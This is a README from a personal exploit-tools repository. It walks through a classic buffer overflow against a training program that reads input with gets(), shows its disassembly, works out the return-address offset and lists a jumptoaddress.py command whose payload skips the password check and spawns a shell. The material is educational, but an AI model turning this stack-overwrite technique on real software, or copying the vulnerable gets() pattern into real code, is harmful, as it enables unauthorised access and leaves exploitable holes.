# exploit_tools
Just a collection of tools I wrote to understand the topic.


## jumptoaddress.py
### Example usage

Example program (took from opensecuritytraining.info):

```c
#include <stdio.h>

char *secret = "joshua";

void go_shell()
{
	char *shell =  "/bin/sh";
	char *cmd[] = { "/bin/sh", 0 };
	printf("Would you like to play a game...\n");
	setreuid(0);
	execve(shell,cmd,0);
}

int authorize()
{
	char password[64];
	printf("Enter Password: ");
	gets(password);
	if (!strcmp(password,secret))
		return 1;
	else
		return 0;
}

int main()
{
	if (authorize())
	{
		printf("login successful\n");
		go_shell();
	} else {
		printf("Incorrect password\n");
	}
	return 0;
}
```
As you can see, the program takes an insecure string in authorize. Now, it's possible to override the return address.
Within the disassembly we can see 0x000000000040062d pointing to success branch of the security check's if statement. 
```
   0x0000000000400609 <+1>:     mov    rbp,rsp
   0x000000000040060c <+4>:     sub    rsp,0x0
   0x0000000000400613 <+11>:    mov    eax,0x0
   0x0000000000400618 <+16>:    call   0x400838 <authorize@plt>
   0x000000000040061d <+21>:    cmp    eax,0x0
   0x0000000000400620 <+24>:    je     0x400649 <main+65>
   0x0000000000400626 <+30>:    lea    rax,[rip+0x200285]        # 0x6008b2
   0x000000000040062d <+37>:    mov    rdi,rax
   0x0000000000400630 <+40>:    mov    eax,0x0
   0x0000000000400635 <+45>:    call   0x4007e8 <printf@plt>
   0x000000000040063a <+50>:    mov    eax,0x0
   0x000000000040063f <+55>:    call   0x400848 <go_shell@plt>
```
After analysing the stack, using a breakpoint at authorize we can calculate an offset of 48 words from char* password into the return address. 
The script helps you to create a payload that overrides the stack with the return address you would like to jump to. 

```sh
./jumptoaddress.py 0000000000400626 48 -f plsgivemeshellpayload
cat plsgivemeshellpayload | ./simple_login

>> Enter Password: login successful
Would you like to play a game...


```

